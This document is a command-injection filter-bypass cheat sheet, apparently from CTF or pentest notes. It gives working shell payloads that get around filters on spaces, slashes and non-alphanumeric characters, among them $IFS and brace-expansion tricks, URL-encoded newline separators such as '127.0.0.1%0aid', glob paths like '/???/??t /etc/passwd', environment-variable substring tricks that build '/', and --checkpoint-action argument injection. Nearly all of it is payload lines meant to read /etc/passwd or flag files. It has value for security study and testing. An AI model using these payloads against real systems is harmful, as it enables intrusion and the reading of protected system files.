# Character Restriction — no space, no slash, alnum-only

## The space problem — `$IFS` and friends

Space is the most-filtered char. Every POSIX way to make whitespace:

| Form | Bytes | Notes |
|---|---|---|
| `$IFS` | literal | default: space/tab/newline |
| `${IFS}` | literal | braced form |
| `$IFS$9` | literal | `$9` is empty → no expansion artifact |
| `{cmd,arg}` | brace expansion | `{ls,-la}` → `ls -la` — NO space/IFS needed |
| `$'\t'` | ANSI-C quote tab | bash only |
| `%09`/`%20` | URL-encoded | filter may not decode before check |
| `<` | redirect | `cat</flag` — no space needed! |
| `${HOME:0:1}` | `/` from $HOME | substring expansion |
| `${PWD:0:1}` | `/` from cwd | |
| `??` glob | `/??`→`/bin` etc | `wildcard-globbing.md` |

Canonical no-space payload:

```
cat${IFS}/flag          → cat /flag
cat</flag               → cat /flag (redirect needs no space!)
{cat,/flag}             → brace expansion: cat /flag
cat${IFS}$PWD           → path join
IFS=,;`cat$IFS/etc/passwd`   — custom IFS
```

`${IFS}` is bourne-safe. `{ls,-la}` is bash/zsh only — dash doesn't do
brace expansion — test `$0`/error strings to identify the shell first.

## The slash problem — paths without `/`

When `/` is filtered:

| Trick | Result |
|---|---|
| `cd` + relative | `cd ..;cd ..;cd etc;cat passwd` — never writes `/` |
| `${HOME:0:1}` | expands to `/` if HOME=/root |
| `${PWD:0:1}` | expands to `/` if cwd is rooted |
| `${0:0:1}` | `/` if $0 is `/bin/sh` |
| `..` chains | `cd ..;cd ..;cd flagdir` |
| glob `/???` | `/bin`→`?in` — `wildcard-globbing.md` |
| `tr` to make `/` | `echo ${HOME:0:1}` — same thing |
| `$$` in some | rare |

Canonical no-slash:

```
cd${IFS}..;cd${IFS}..;cd${IFS}etc;cat${IFS}passwd
cat${IFS}${HOME:0:1}flag    — if /flag
${HOME:0:1}bin${HOME:0:1}sh — no, needs more
```

For arbitrary paths, build `/` once:

```
x=${PWD:0:1};cat${IFS}${x}flag
```

## Alphanumeric-only — the hardest filter

If only `[a-zA-Z0-9]` pass, the injection surface collapses — but:

- `$IFS` needs `$` — dead if `$` is filtered
- the arg-position still allows **argument injection** —
  `argument-injection.md`: a filter that allows `a-zA-Z0-9_-` still
  lets `-exec`, `--checkpoint-action`, `-o`, `--help` through
- no metachar means no new command — but the ORIGINAL command's args
  are still attacker-controlled → flag injection remains

`--checkpoint-action=exec=sh` needs `-`, `=` — check which symbols pass.

## Newline as space — `%0a`/`%0d`

`%0a` decodes to `\n` — which IS a command separator AND a whitespace:

```
127.0.0.1%0aid           — separator
cat%0a/flag              — whitespace inside command
cat%20%2fflag            — space+slash via url-encoding if decoded late
```

Filters checking for literal ` ` (0x20) miss `%20`/`%09`/`%0a` if they
check pre-decode — and miss `+` too (space in application/x-www-form-
urlencoded).

## Tab — `%09` — POSIX whitespace

`cat%09/flag` — tab is whitespace in shell — many space filters only
block `0x20`, not `0x09`.

## `<<` and here-strings — no space needed

```
cat<<<x              — herestring (bash)
cat<<EOF\nx\nEOF     — heredoc
cmd<<<$var
```

`<<<` needs bash; `<<` needs the terminator on a later line — usually
not useful for single-line injection.

## The `?`/`*`/`[]` glob path — when names are filtered but `?` isn't

```
/???/??t /etc/passwd   → /bin/cat /etc/passwd
/???/??                 → glob expansions
```

`wildcard-globbing.md` has the full glob-reference — this is the
name-filter answer.

## The ${} expansion toolkit — building chars you can't type

```
${IFS}                  whitespace
${HOME:0:1}             /
${PWD:0:1}              / (if cwd rooted)
${PWD##*/}              basename of cwd
${HOSTNAME:0:1}         first char of hostname — letter smuggling
${USER:0:1}             first char of user
${PATH:0:1}             /
${0:0:1}                / or s (depends on $0)
${RANDOM:0:1}           random digit — unstable
${LANG:0:1}             'C' or 'e'
${SHELL:0:1}            /
${OLDPWD:0:1}           /
${PS1:0:1}              \ or [
```

Letter smuggling via substrings — build `c`, `a`, `t` from env vars:

```
c=${HOME:0:1}           — get '/' from HOME
${PATH:5:1}             — 'b' or '/' depending on PATH content
```

This is slow but survives near-total filters.

## `${var,,}` `${var^^}` — case transforms (bash)

```
${SHELL,,} ${HOSTNAME^^} — rarely the answer but worth knowing
```

## The `.` source command — exec without explicit name

```
. file.sh         — source — needs a file
```

## Falsifiers

- alnum-only + no useful env vars AND argv position doesn't accept flags
- the filter applies post-decode AND covers all whitespace bytes

## Output to record

- which chars pass the filter (byte-level classification) + the working
  whitespace/path construction
